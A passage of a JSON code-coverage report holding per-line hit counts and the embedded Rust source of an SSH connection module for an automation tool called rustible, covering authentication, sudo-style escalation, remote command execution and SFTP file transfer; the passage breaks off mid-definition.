ine":0}},{"line":962,"address":[33234270,33234437],"length":1,"stats":{"Line":0}},{"line":963,"address":[33234445],"length":1,"stats":{"Line":0}},{"line":964,"address":[23459147,23459006],"length":1,"stats":{"Line":0}},{"line":965,"address":[23459162],"length":1,"stats":{"Line":0}},{"line":967,"address":[26030364],"length":1,"stats":{"Line":0}},{"line":968,"address":[23459733],"length":1,"stats":{"Line":0}},{"line":971,"address":[26030380],"length":1,"stats":{"Line":0}},{"line":975,"address":[33234540],"length":1,"stats":{"Line":0}},{"line":976,"address":[33234575],"length":1,"stats":{"Line":0}},{"line":977,"address":[33234609],"length":1,"stats":{"Line":0}},{"line":978,"address":[23461038,23461147],"length":1,"stats":{"Line":0}},{"line":980,"address":[26030076],"length":1,"stats":{"Line":0}},{"line":981,"address":[23461687],"length":1,"stats":{"Line":0}},{"line":984,"address":[26030092],"length":1,"stats":{"Line":0}},{"line":1001,"address":[33236224,33236673,33236648],"length":1,"stats":{"Line":0}},{"line":1003,"address":[33236251,33236321],"length":1,"stats":{"Line":0}},{"line":1004,"address":[33236349,33236404],"length":1,"stats":{"Line":0}},{"line":1005,"address":[33236421],"length":1,"stats":{"Line":0}},{"line":1007,"address":[33236546,33236478],"length":1,"stats":{"Line":0}},{"line":1011,"address":[33235888],"length":1,"stats":{"Line":0}},{"line":1012,"address":[33235897],"length":1,"stats":{"Line":0}},{"line":1015,"address":[33236096],"length":1,"stats":{"Line":0}},{"line":1016,"address":[33236105],"length":1,"stats":{"Line":0}},{"line":1019,"address":[33236192],"length":1,"stats":{"Line":0}},{"line":1020,"address":[33236197],"length":1,"stats":{"Line":0}},{"line":1023,"address":[33235936],"length":1,"stats":{"Line":0}},{"line":1024,"address":[33235941],"length":1,"stats":{"Line":0}},{"line":1027,"address":[33236704],"length":1,"stats":{"Line":0}},{"line":1028,"address":[33236709],"length":1,"stats":{"Line":0}},{"line":1031,"address":[33236720],"length":1,"stats":{"Line":0}},{"line":1032,"address":[33236725],"length":1,"stats":{"Line":0}},{"line":1035,"address":[33236736],"length":1,"stats":{"Line":0}},{"line":1036,"address":[33236741],"length":1,"stats":{"Line":0}},{"line":1039,"address":[33235984],"length":1,"stats":{"Line":0}},{"line":1040,"address":[33235989],"length":1,"stats":{"Line":0}},{"line":1043,"address":[33236160],"length":1,"stats":{"Line":0}},{"line":1044,"address":[33236165],"length":1,"stats":{"Line":0}},{"line":1047,"address":[33236016],"length":1,"stats":{"Line":0}},{"line":1048,"address":[33236030],"length":1,"stats":{"Line":0}},{"line":1049,"address":[33236058],"length":1,"stats":{"Line":0}},{"line":1055,"address":[26404224],"length":1,"stats":{"Line":0}},{"line":1056,"address":[26404229],"length":1,"stats":{"Line":0}},{"line":1067,"address":[33237504],"length":1,"stats":{"Line":1}},{"line":1069,"address":[33237520],"length":1,"stats":{"Line":1}},{"line":1070,"address":[33237530],"length":1,"stats":{"Line":1}},{"line":1074,"address":[33236880,33237021],"length":1,"stats":{"Line":0}},{"line":1075,"address":[33236981,33236912],"length":1,"stats":{"Line":0}},{"line":1076,"address":[33237001],"length":1,"stats":{"Line":0}},{"line":1079,"address":[33237344],"length":1,"stats":{"Line":1}},{"line":1080,"address":[33237361],"length":1,"stats":{"Line":1}},{"line":1081,"address":[33237368],"length":1,"stats":{"Line":1}},{"line":1084,"address":[33237392],"length":1,"stats":{"Line":1}},{"line":1085,"address":[33237409],"length":1,"stats":{"Line":1}},{"line":1086,"address":[33237416],"length":1,"stats":{"Line":1}},{"line":1089,"address":[33237168],"length":1,"stats":{"Line":1}},{"line":1090,"address":[33237185],"length":1,"stats":{"Line":1}},{"line":1091,"address":[33237192],"length":1,"stats":{"Line":1}},{"line":1094,"address":[33236752],"length":1,"stats":{"Line":1}},{"line":1095,"address":[33236772],"length":1,"stats":{"Line":1}},{"line":1096,"address":[33236785],"length":1,"stats":{"Line":1}},{"line":1099,"address":[33237104],"length":1,"stats":{"Line":0}},{"line":1100,"address":[33237124],"length":1,"stats":{"Line":0}},{"line":1101,"address":[33237137],"length":1,"stats":{"Line":0}},{"line":1104,"address":[33237040],"length":1,"stats":{"Line":1}},{"line":1105,"address":[33237063],"length":1,"stats":{"Line":1}},{"line":1106,"address":[33237071],"length":1,"stats":{"Line":1}},{"line":1109,"address":[33237296],"length":1,"stats":{"Line":0}},{"line":1110,"address":[33237312],"length":1,"stats":{"Line":0}},{"line":1111,"address":[33237318],"length":1,"stats":{"Line":0}},{"line":1114,"address":[33236816],"length":1,"stats":{"Line":0}},{"line":1115,"address":[33236836],"length":1,"stats":{"Line":0}},{"line":1116,"address":[33236849],"length":1,"stats":{"Line":0}},{"line":1119,"address":[33237440],"length":1,"stats":{"Line":0}},{"line":1120,"address":[33237460],"length":1,"stats":{"Line":0}},{"line":1121,"address":[33237473],"length":1,"stats":{"Line":0}},{"line":1124,"address":[33237616],"length":1,"stats":{"Line":1}},{"line":1125,"address":[33237630],"length":1,"stats":{"Line":1}},{"line":1126,"address":[33237703],"length":1,"stats":{"Line":1}},{"line":1129,"address":[33237216,33237274],"length":1,"stats":{"Line":0}},{"line":1130,"address":[33237220],"length":1,"stats":{"Line":0}},{"line":1131,"address":[33237232],"length":1,"stats":{"Line":0}},{"line":1132,"address":[33237265],"length":1,"stats":{"Line":0}},{"line":1137,"address":[33226176],"length":1,"stats":{"Line":0}},{"line":1138,"address":[33226184],"length":1,"stats":{"Line":0}}],"covered":104,"coverable":494},{"path":["/","home","artur","Repositories","rustible","src","connection","ssh.rs"],"content":"//! SSH connection module\n//!\n//! This module provides SSH connectivity using the ssh2 crate.\n//! It supports key-based authentication, password authentication,\n//! SSH agent support, and SFTP for file transfers.\n\nuse async_trait::async_trait;\nuse parking_lot::Mutex;\nuse ssh2::{Session, Sftp};\nuse std::io::{Read, Write};\nuse std::net::TcpStream;\nuse std::path::{Path, PathBuf};\nuse std::sync::Arc;\nuse std::time::Duration;\nuse tokio::task;\nuse tracing::{debug, trace, warn};\n\nuse super::config::{\n    default_identity_files, expand_path, ConnectionConfig, HostConfig, RetryConfig,\n};\nuse super::{\n    CommandResult, Connection, ConnectionError, ConnectionResult, ExecuteOptions, FileStat,\n    TransferOptions,\n};\n\n/// SSH connection implementation using ssh2 crate\npub struct SshConnection {\n    /// Session identifier\n    identifier: String,\n    /// SSH session (wrapped in Arc\u003cMutex\u003e for thread safety)\n    session: Arc\u003cMutex\u003cSession\u003e\u003e,\n    /// Host configuration\n    host_config: HostConfig,\n    /// Whether the connection is established\n    connected: Arc\u003cMutex\u003cbool\u003e\u003e,\n}\n\nimpl SshConnection {\n    /// Connect to a remote host via SSH\n    pub async fn connect(\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        host_config: Option\u003cHostConfig\u003e,\n        global_config: \u0026ConnectionConfig,\n    ) -\u003e ConnectionResult\u003cSelf\u003e {\n        let host_config = host_config.unwrap_or_else(|| global_config.get_host_merged(host));\n        let retry_config = host_config.retry_config();\n\n        let actual_host = host_config.hostname.as_deref().unwrap_or(host);\n        let actual_port = host_config.port.unwrap_or(port);\n        let actual_user = host_config.user.as_deref().unwrap_or(user);\n        let timeout = host_config.timeout_duration();\n\n        debug!(\n            host = %actual_host,\n            port = %actual_port,\n            user = %actual_user,\n            \"Connecting via SSH\"\n        );\n\n        let identifier = format!(\"{}@{}:{}\", actual_user, actual_host, actual_port);\n\n        // Clone values for the blocking task\n        let host_owned = actual_host.to_string();\n        let port_owned = actual_port;\n        let user_owned = actual_user.to_string();\n        let config_owned = host_config.clone();\n        let global_config_owned = global_config.clone();\n        let timeout_owned = timeout;\n        let retry_config_owned = retry_config.clone();\n\n        // Run connection in a blocking task since ssh2 is synchronous\n        let session = task::spawn_blocking(move || {\n            Self::connect_with_retry(\n                \u0026host_owned,\n                port_owned,\n                \u0026user_owned,\n                \u0026config_owned,\n                \u0026global_config_owned,\n                timeout_owned,\n                \u0026retry_config_owned,\n            )\n        })\n        .await\n        .map_err(|e| ConnectionError::ConnectionFailed(format!(\"Task join error: {}\", e)))??;\n\n        Ok(Self {\n            identifier,\n            session: Arc::new(Mutex::new(session)),\n            host_config,\n            connected: Arc::new(Mutex::new(true)),\n        })\n    }\n\n    /// Connect with retry logic\n    fn connect_with_retry(\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        host_config: \u0026HostConfig,\n        global_config: \u0026ConnectionConfig,\n        timeout: Duration,\n        retry_config: \u0026RetryConfig,\n    ) -\u003e ConnectionResult\u003cSession\u003e {\n        let mut last_error = None;\n\n        for attempt in 0..=retry_config.max_retries {\n            if attempt \u003e 0 {\n                let delay = retry_config.delay_for_attempt(attempt - 1);\n                debug!(attempt = %attempt, delay = ?delay, \"Retrying SSH connection\");\n                std::thread::sleep(delay);\n            }\n\n            match Self::do_connect(host, port, user, host_config, global_config, timeout) {\n                Ok(session) =\u003e return Ok(session),\n                Err(e) =\u003e {\n                    warn!(attempt = %attempt, error = %e, \"SSH connection attempt failed\");\n                    last_error = Some(e);\n                }\n            }\n        }\n\n        Err(last_error.unwrap_or_else(|| {\n            ConnectionError::ConnectionFailed(\"Unknown connection error\".to_string())\n        }))\n    }\n\n    /// Perform the actual connection\n    fn do_connect(\n        host: \u0026str,\n        port: u16,\n        user: \u0026str,\n        host_config: \u0026HostConfig,\n        global_config: \u0026ConnectionConfig,\n        timeout: Duration,\n    ) -\u003e ConnectionResult\u003cSession\u003e {\n        // Create TCP connection\n        let addr = format!(\"{}:{}\", host, port);\n        let tcp = TcpStream::connect_timeout(\n            \u0026addr.parse().map_err(|e| {\n                ConnectionError::ConnectionFailed(format!(\"Invalid address {}: {}\", addr, e))\n            })?,\n            timeout,\n        )\n        .map_err(|e| {\n            ConnectionError::ConnectionFailed(format!(\"Failed to connect to {}: {}\", addr, e))\n        })?;\n\n        // Set TCP options\n        tcp.set_read_timeout(Some(timeout)).ok();\n        tcp.set_write_timeout(Some(timeout)).ok();\n        tcp.set_nodelay(true).ok();\n\n        // Create SSH session\n        let mut session = Session::new().map_err(|e| {\n            ConnectionError::ConnectionFailed(format!(\"Failed to create SSH session: {}\", e))\n        })?;\n\n        session.set_tcp_stream(tcp);\n        session.set_timeout(timeout.as_millis() as u32);\n\n        // Enable compression if configured\n        if host_config.compression {\n            session.set_compress(true);\n        }\n\n        // Perform SSH handshake\n        session.handshake().map_err(|e| {\n            ConnectionError::ConnectionFailed(format!(\"SSH handshake failed: {}\", e))\n        })?;\n\n        // Authenticate\n        Self::authenticate(\u0026session, user, host_config, global_config)?;\n\n        debug!(\"SSH connection established successfully\");\n        Ok(session)\n    }\n\n    /// Perform SSH authentication\n    fn authenticate(\n        session: \u0026Session,\n        user: \u0026str,\n        host_config: \u0026HostConfig,\n        global_config: \u0026ConnectionConfig,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        // Get available authentication methods\n        let methods = session.auth_methods(user).map_err(|e| {\n            ConnectionError::AuthenticationFailed(format!(\"Failed to get auth methods: {}\", e))\n        })?;\n\n        debug!(methods = %methods, \"Available authentication methods\");\n\n        // Try SSH agent first if enabled\n        if global_config.defaults.use_agent \u0026\u0026 methods.contains(\"publickey\") {\n            if Self::try_agent_auth(session, user).is_ok() {\n                debug!(\"Authenticated using SSH agent\");\n                return Ok(());\n            }\n        }\n\n        // Try key-based authentication\n        if methods.contains(\"publickey\") {\n            // Try specific identity file if configured\n            if let Some(identity_file) = \u0026host_config.identity_file {\n                let key_path = expand_path(identity_file);\n                if Self::try_key_auth(session, user, \u0026key_path, host_config.password.as_deref())\n                    .is_ok()\n                {\n                    debug!(key = %key_path.display(), \"Authenticated using key\");\n                    return Ok(());\n                }\n            }\n\n            // Try default identity files from global config\n            for identity_file in \u0026global_config.defaults.identity_files {\n                let key_path = expand_path(identity_file);\n                if Self::try_key_auth(session, user, \u0026key_path, host_config.password.as_deref())\n                    .is_ok()\n                {\n                    debug!(key = %key_path.display(), \"Authenticated using key\");\n                    return Ok(());\n                }\n            }\n\n            // Try default identity files\n            for key_path in default_identity_files() {\n                if Self::try_key_auth(session, user, \u0026key_path, host_config.password.as_deref())\n                    .is_ok()\n                {\n                    debug!(key = %key_path.display(), \"Authenticated using key\");\n                    return Ok(());\n                }\n            }\n        }\n\n        // Try password authentication\n        if methods.contains(\"password\") {\n            if let Some(password) = \u0026host_config.password {\n                session.userauth_password(user, password).map_err(|e| {\n                    ConnectionError::AuthenticationFailed(format!(\n                        \"Password authentication failed: {}\",\n                        e\n                    ))\n                })?;\n\n                if session.authenticated() {\n                    debug!(\"Authenticated using password\");\n                    return Ok(());\n                }\n            }\n        }\n\n        // Try keyboard-interactive authentication\n        // Note: keyboard-interactive requires implementing KeyboardInteractivePrompt trait\n        // For simplicity, we skip this method and rely on password auth instead\n        if methods.contains(\"keyboard-interactive\") \u0026\u0026 !methods.contains(\"password\") {\n            debug!(\"Keyboard-interactive auth available but not implemented, skipping\");\n        }\n\n        Err(ConnectionError::AuthenticationFailed(\n            \"All authentication methods failed\".to_string(),\n        ))\n    }\n\n    /// Try SSH agent authentication\n    fn try_agent_auth(session: \u0026Session, user: \u0026str) -\u003e ConnectionResult\u003c()\u003e {\n        let mut agent = session.agent().map_err(|e| {\n            ConnectionError::AuthenticationFailed(format!(\"Failed to connect to SSH agent: {}\", e))\n        })?;\n\n        agent.connect().map_err(|e| {\n            ConnectionError::AuthenticationFailed(format!(\"Failed to connect to SSH agent: {}\", e))\n        })?;\n\n        agent.list_identities().map_err(|e| {\n            ConnectionError::AuthenticationFailed(format!(\"Failed to list agent identities: {}\", e))\n        })?;\n\n        for identity in agent.identities().unwrap_or_default() {\n            if agent.userauth(user, \u0026identity).is_ok() \u0026\u0026 session.authenticated() {\n                return Ok(());\n            }\n        }\n\n        Err(ConnectionError::AuthenticationFailed(\n            \"No suitable agent identity found\".to_string(),\n        ))\n    }\n\n    /// Try key-based authentication\n    fn try_key_auth(\n        session: \u0026Session,\n        user: \u0026str,\n        key_path: \u0026Path,\n        passphrase: Option\u003c\u0026str\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        if !key_path.exists() {\n            return Err(ConnectionError::AuthenticationFailed(format!(\n                \"Key file not found: {}\",\n                key_path.display()\n            )));\n        }\n\n        // Try with passphrase\n        session\n            .userauth_pubkey_file(user, None, key_path, passphrase)\n            .map_err(|e| {\n                ConnectionError::AuthenticationFailed(format!(\n                    \"Key authentication failed for {}: {}\",\n                    key_path.display(),\n                    e\n                ))\n            })?;\n\n        if session.authenticated() {\n            Ok(())\n        } else {\n            Err(ConnectionError::AuthenticationFailed(\n                \"Key authentication failed\".to_string(),\n            ))\n        }\n    }\n\n    /// Execute a command on the remote host (synchronous)\n    fn exec_sync(\n        session: \u0026Session,\n        command: \u0026str,\n        options: \u0026ExecuteOptions,\n    ) -\u003e ConnectionResult\u003cCommandResult\u003e {\n        let mut channel = session.channel_session().map_err(|e| {\n            ConnectionError::ExecutionFailed(format!(\"Failed to open channel: {}\", e))\n        })?;\n\n        // Build the full command with options\n        let full_command = Self::build_command(command, options);\n\n        trace!(command = %full_command, \"Executing remote command\");\n\n        // Set environment variables\n        for (key, value) in \u0026options.env {\n            let _ = channel.setenv(key, value);\n        }\n\n        // Execute the command\n        channel.exec(\u0026full_command).map_err(|e| {\n            ConnectionError::ExecutionFailed(format!(\"Failed to execute command: {}\", e))\n        })?;\n\n        // Handle escalation password if needed\n        if options.escalate \u0026\u0026 options.escalate_password.is_some() {\n            let password = options.escalate_password.as_ref().unwrap();\n            channel\n                .write_all(format!(\"{}\\n\", password).as_bytes())\n                .map_err(|e| {\n                    ConnectionError::ExecutionFailed(format!(\"Failed to write password: {}\", e))\n                })?;\n        }\n\n        // Read stdout\n        let mut stdout = String::new();\n        channel.read_to_string(\u0026mut stdout).map_err(|e| {\n            ConnectionError::ExecutionFailed(format!(\"Failed to read stdout: {}\", e))\n        })?;\n\n        // Read stderr\n        let mut stderr = String::new();\n        channel.stderr().read_to_string(\u0026mut stderr).map_err(|e| {\n            ConnectionError::ExecutionFailed(format!(\"Failed to read stderr: {}\", e))\n        })?;\n\n        // Wait for exit and get exit status\n        channel.wait_close().ok();\n        let exit_code = channel.exit_status().unwrap_or(-1);\n\n        trace!(exit_code = %exit_code, \"Command completed\");\n\n        if exit_code == 0 {\n            Ok(CommandResult::success(stdout, stderr))\n        } else {\n            Ok(CommandResult::failure(exit_code, stdout, stderr))\n        }\n    }\n\n    /// Build command string with options\n    fn build_command(command: \u0026str, options: \u0026ExecuteOptions) -\u003e String {\n        let mut parts = Vec::new();\n\n        // Add working directory\n        if let Some(cwd) = \u0026options.cwd {\n            parts.push(format!(\"cd {} \u0026\u0026 \", cwd));\n        }\n\n        // Handle privilege escalation\n        if options.escalate {\n            let escalate_method = options.escalate_method.as_deref().unwrap_or(\"sudo\");\n            let escalate_user = options.escalate_user.as_deref().unwrap_or(\"root\");\n\n            match escalate_method {\n                \"sudo\" =\u003e {\n                    if options.escalate_password.is_some() {\n                        parts.push(format!(\"sudo -S -u {} -- \", escalate_user));\n                    } else {\n                        parts.push(format!(\"sudo -u {} -- \", escalate_user));\n                    }\n                }\n                \"su\" =\u003e {\n                    parts.push(format!(\"su - {} -c \", escalate_user));\n                }\n                \"doas\" =\u003e {\n                    parts.push(format!(\"doas -u {} \", escalate_user));\n                }\n                _ =\u003e {\n                    parts.push(format!(\"sudo -u {} -- \", escalate_user));\n                }\n            }\n        }\n\n        parts.push(command.to_string());\n        parts.concat()\n    }\n\n    /// Get SFTP session\n    fn get_sftp(session: \u0026Session) -\u003e ConnectionResult\u003cSftp\u003e {\n        session.sftp().map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to open SFTP channel: {}\", e))\n        })\n    }\n}\n\n#[async_trait]\nimpl Connection for SshConnection {\n    fn identifier(\u0026self) -\u003e \u0026str {\n        \u0026self.identifier\n    }\n\n    async fn is_alive(\u0026self) -\u003e bool {\n        let session = self.session.clone();\n        let connected = self.connected.clone();\n\n        task::spawn_blocking(move || {\n            if !*connected.lock() {\n                return false;\n            }\n\n            let session = session.lock();\n            // Try to send a keepalive to check if connection is alive\n            session.keepalive_send().is_ok()\n        })\n        .await\n        .unwrap_or(false)\n    }\n\n    async fn execute(\n        \u0026self,\n        command: \u0026str,\n        options: Option\u003cExecuteOptions\u003e,\n    ) -\u003e ConnectionResult\u003cCommandResult\u003e {\n        let options = options.unwrap_or_default();\n        let session = self.session.clone();\n        let command = command.to_string();\n\n        // Check for timeout\n        let timeout = options.timeout;\n\n        let result = task::spawn_blocking(move || {\n            let session = session.lock();\n            Self::exec_sync(\u0026session, \u0026command, \u0026options)\n        });\n\n        if let Some(timeout_secs) = timeout {\n            match tokio::time::timeout(Duration::from_secs(timeout_secs), result).await {\n                Ok(Ok(result)) =\u003e result,\n                Ok(Err(e)) =\u003e Err(ConnectionError::ExecutionFailed(format!(\n                    \"Task join error: {}\",\n                    e\n                ))),\n                Err(_) =\u003e Err(ConnectionError::Timeout(timeout_secs)),\n            }\n        } else {\n            result\n                .await\n                .map_err(|e| ConnectionError::ExecutionFailed(format!(\"Task join error: {}\", e)))?\n        }\n    }\n\n    async fn upload(\n        \u0026self,\n        local_path: \u0026Path,\n        remote_path: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let options = options.unwrap_or_default();\n        let session = self.session.clone();\n        let local_path = local_path.to_path_buf();\n        let remote_path = remote_path.to_path_buf();\n\n        debug!(\n            local = %local_path.display(),\n            remote = %remote_path.display(),\n            \"Uploading file via SFTP\"\n        );\n\n        task::spawn_blocking(move || {\n            let session = session.lock();\n            let sftp = Self::get_sftp(\u0026session)?;\n\n            // Create parent directories if needed\n            if options.create_dirs {\n                if let Some(parent) = remote_path.parent() {\n                    Self::create_remote_dirs(\u0026sftp, parent)?;\n                }\n            }\n\n            // Read local file\n            let content = std::fs::read(\u0026local_path).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\n                    \"Failed to read local file {}: {}\",\n                    local_path.display(),\n                    e\n                ))\n            })?;\n\n            // Write to remote file\n            let mode = options.mode.unwrap_or(0o644);\n            let mut remote_file = sftp.create(\u0026remote_path).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\n                    \"Failed to create remote file {}: {}\",\n                    remote_path.display(),\n                    e\n                ))\n            })?;\n\n            remote_file.write_all(\u0026content).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to write to remote file: {}\", e))\n            })?;\n\n            // Set permissions using chmod via SFTP\n            // Note: sftp.stat and chmod aren't directly available, so we'll use exec\n            drop(remote_file);\n            drop(sftp);\n\n            // Set mode via command\n            let chmod_cmd = format!(\"chmod {:o} {}\", mode, remote_path.display());\n            let mut channel = session.channel_session().map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to open channel: {}\", e))\n            })?;\n            channel.exec(\u0026chmod_cmd).ok();\n            channel.wait_close().ok();\n\n            // Set owner/group if specified\n            if options.owner.is_some() || options.group.is_some() {\n                let ownership = match (\u0026options.owner, \u0026options.group) {\n                    (Some(o), Some(g)) =\u003e format!(\"{}:{}\", o, g),\n                    (Some(o), None) =\u003e o.to_string(),\n                    (None, Some(g)) =\u003e format!(\":{}\", g),\n                    (None, None) =\u003e return Ok(()),\n                };\n\n                let chown_cmd = format!(\"chown {} {}\", ownership, remote_path.display());\n                let mut channel = session.channel_session().map_err(|e| {\n                    ConnectionError::TransferFailed(format!(\"Failed to open channel: {}\", e))\n                })?;\n                channel.exec(\u0026chown_cmd).ok();\n                channel.wait_close().ok();\n            }\n\n            Ok(())\n        })\n        .await\n        .map_err(|e| ConnectionError::TransferFailed(format!(\"Task join error: {}\", e)))?\n    }\n\n    async fn upload_content(\n        \u0026self,\n        content: \u0026[u8],\n        remote_path: \u0026Path,\n        options: Option\u003cTransferOptions\u003e,\n    ) -\u003e ConnectionResult\u003c()\u003e {\n        let options = options.unwrap_or_default();\n        let session = self.session.clone();\n        let content = content.to_vec();\n        let remote_path = remote_path.to_path_buf();\n\n        debug!(\n            remote = %remote_path.display(),\n            size = %content.len(),\n            \"Uploading content via SFTP\"\n        );\n\n        task::spawn_blocking(move || {\n            let session = session.lock();\n            let sftp = Self::get_sftp(\u0026session)?;\n\n            // Create parent directories if needed\n            if options.create_dirs {\n                if let Some(parent) = remote_path.parent() {\n                    Self::create_remote_dirs(\u0026sftp, parent)?;\n                }\n            }\n\n            // Write to remote file\n            let mode = options.mode.unwrap_or(0o644);\n            let mut remote_file = sftp.create(\u0026remote_path).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\n                    \"Failed to create remote file {}: {}\",\n                    remote_path.display(),\n                    e\n                ))\n            })?;\n\n            remote_file.write_all(\u0026content).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to write to remote file: {}\", e))\n            })?;\n\n            drop(remote_file);\n            drop(sftp);\n\n            // Set mode via command\n            let chmod_cmd = format!(\"chmod {:o} {}\", mode, remote_path.display());\n            let mut channel = session.channel_session().map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to open channel: {}\", e))\n            })?;\n            channel.exec(\u0026chmod_cmd).ok();\n            channel.wait_close().ok();\n\n            // Set owner/group if specified\n            if options.owner.is_some() || options.group.is_some() {\n                let ownership = match (\u0026options.owner, \u0026options.group) {\n                    (Some(o), Some(g)) =\u003e format!(\"{}:{}\", o, g),\n                    (Some(o), None) =\u003e o.to_string(),\n                    (None, Some(g)) =\u003e format!(\":{}\", g),\n                    (None, None) =\u003e return Ok(()),\n                };\n\n                let chown_cmd = format!(\"chown {} {}\", ownership, remote_path.display());\n                let mut channel = session.channel_session().map_err(|e| {\n                    ConnectionError::TransferFailed(format!(\"Failed to open channel: {}\", e))\n                })?;\n                channel.exec(\u0026chown_cmd).ok();\n                channel.wait_close().ok();\n            }\n\n            Ok(())\n        })\n        .await\n        .map_err(|e| ConnectionError::TransferFailed(format!(\"Task join error: {}\", e)))?\n    }\n\n    async fn download(\u0026self, remote_path: \u0026Path, local_path: \u0026Path) -\u003e ConnectionResult\u003c()\u003e {\n        let session = self.session.clone();\n        let remote_path = remote_path.to_path_buf();\n        let local_path = local_path.to_path_buf();\n\n        debug!(\n            remote = %remote_path.display(),\n            local = %local_path.display(),\n            \"Downloading file via SFTP\"\n        );\n\n        task::spawn_blocking(move || {\n            let session = session.lock();\n            let sftp = Self::get_sftp(\u0026session)?;\n\n            // Open remote file\n            let mut remote_file = sftp.open(\u0026remote_path).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\n                    \"Failed to open remote file {}: {}\",\n                    remote_path.display(),\n                    e\n                ))\n            })?;\n\n            // Read content\n            let mut content = Vec::new();\n            remote_file.read_to_end(\u0026mut content).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to read remote file: {}\", e))\n            })?;\n\n            // Create parent directories for local file\n            if let Some(parent) = local_path.parent() {\n                std::fs::create_dir_all(parent).map_err(|e| {\n                    ConnectionError::TransferFailed(format!(\n                        \"Failed to create local directory {}: {}\",\n                        parent.display(),\n                        e\n                    ))\n                })?;\n            }\n\n            // Write local file\n            std::fs::write(\u0026local_path, \u0026content).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\n                    \"Failed to write local file {}: {}\",\n                    local_path.display(),\n                    e\n                ))\n            })?;\n\n            Ok(())\n        })\n        .await\n        .map_err(|e| ConnectionError::TransferFailed(format!(\"Task join error: {}\", e)))?\n    }\n\n    async fn download_content(\u0026self, remote_path: \u0026Path) -\u003e ConnectionResult\u003cVec\u003cu8\u003e\u003e {\n        let session = self.session.clone();\n        let remote_path = remote_path.to_path_buf();\n\n        debug!(remote = %remote_path.display(), \"Downloading content via SFTP\");\n\n        task::spawn_blocking(move || {\n            let session = session.lock();\n            let sftp = Self::get_sftp(\u0026session)?;\n\n            // Open remote file\n            let mut remote_file = sftp.open(\u0026remote_path).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\n                    \"Failed to open remote file {}: {}\",\n                    remote_path.display(),\n                    e\n                ))\n            })?;\n\n            // Read content\n            let mut content = Vec::new();\n            remote_file.read_to_end(\u0026mut content).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to read remote file: {}\", e))\n            })?;\n\n            Ok(content)\n        })\n        .await\n        .map_err(|e| ConnectionError::TransferFailed(format!(\"Task join error: {}\", e)))?\n    }\n\n    async fn path_exists(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cbool\u003e {\n        let session = self.session.clone();\n        let path = path.to_path_buf();\n\n        task::spawn_blocking(move || {\n            let session = session.lock();\n            let sftp = Self::get_sftp(\u0026session)?;\n            Ok(sftp.stat(\u0026path).is_ok())\n        })\n        .await\n        .map_err(|e| ConnectionError::ExecutionFailed(format!(\"Task join error: {}\", e)))?\n    }\n\n    async fn is_directory(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cbool\u003e {\n        let session = self.session.clone();\n        let path = path.to_path_buf();\n\n        task::spawn_blocking(move || {\n            let session = session.lock();\n            let sftp = Self::get_sftp(\u0026session)?;\n\n            match sftp.stat(\u0026path) {\n                Ok(stat) =\u003e Ok(stat.is_dir()),\n                Err(_) =\u003e Ok(false),\n            }\n        })\n        .await\n        .map_err(|e| ConnectionError::ExecutionFailed(format!(\"Task join error: {}\", e)))?\n    }\n\n    async fn stat(\u0026self, path: \u0026Path) -\u003e ConnectionResult\u003cFileStat\u003e {\n        let session = self.session.clone();\n        let path = path.to_path_buf();\n\n        task::spawn_blocking(move || {\n            let session = session.lock();\n            let sftp = Self::get_sftp(\u0026session)?;\n\n            let stat = sftp.stat(\u0026path).map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to stat {}: {}\", path.display(), e))\n            })?;\n\n            Ok(FileStat {\n                size: stat.size.unwrap_or(0),\n                mode: stat.perm.unwrap_or(0),\n                uid: stat.uid.unwrap_or(0),\n                gid: stat.gid.unwrap_or(0),\n                atime: stat.atime.map(|t| t as i64).unwrap_or(0),\n                mtime: stat.mtime.map(|t| t as i64).unwrap_or(0),\n                is_dir: stat.is_dir(),\n                is_file: stat.is_file(),\n                is_symlink: false, // ssh2 stat doesn't distinguish symlinks\n            })\n        })\n        .await\n        .map_err(|e| ConnectionError::TransferFailed(format!(\"Task join error: {}\", e)))?\n    }\n\n    async fn close(\u0026self) -\u003e ConnectionResult\u003c()\u003e {\n        let session = self.session.clone();\n        let connected = self.connected.clone();\n\n        task::spawn_blocking(move || {\n            let mut connected_guard = connected.lock();\n            if *connected_guard {\n                let session = session.lock();\n                session.disconnect(None, \"Connection closed\", None).ok();\n                *connected_guard = false;\n            }\n            Ok(())\n        })\n        .await\n        .map_err(|e| ConnectionError::ConnectionFailed(format!(\"Task join error: {}\", e)))?\n    }\n}\n\nimpl SshConnection {\n    /// Create remote directories recursively\n    fn create_remote_dirs(sftp: \u0026Sftp, path: \u0026Path) -\u003e ConnectionResult\u003c()\u003e {\n        // Split path into components and create each directory\n        let mut current = PathBuf::new();\n        for component in path.components() {\n            current.push(component);\n\n            // Skip root\n            if current.to_string_lossy() == \"/\" {\n                continue;\n            }\n\n            // Try to create directory (ignore error if it already exists)\n            if sftp.stat(\u0026current).is_err() {\n                sftp.mkdir(\u0026current, 0o755).ok();\n            }\n        }\n\n        Ok(())\n    }\n}\n\nimpl std::fmt::Debug for SshConnection {\n    fn fmt(\u0026self, f: \u0026mut std::fmt::Formatter\u003c'_\u003e) -\u003e std::fmt::Result {\n        f.debug_struct(\"SshConnection\")\n            .field(\"identifier\", \u0026self.identifier)\n            .field(\"connected\", \u0026*self.connected.lock())\n            .finish()\n    }\n}\n\n/// Builder for SSH connections\npub struct SshConnectionBuilder {\n    host: String,\n    port: u16,\n    user: String,\n    password: Option\u003cString\u003e,\n    private_key: 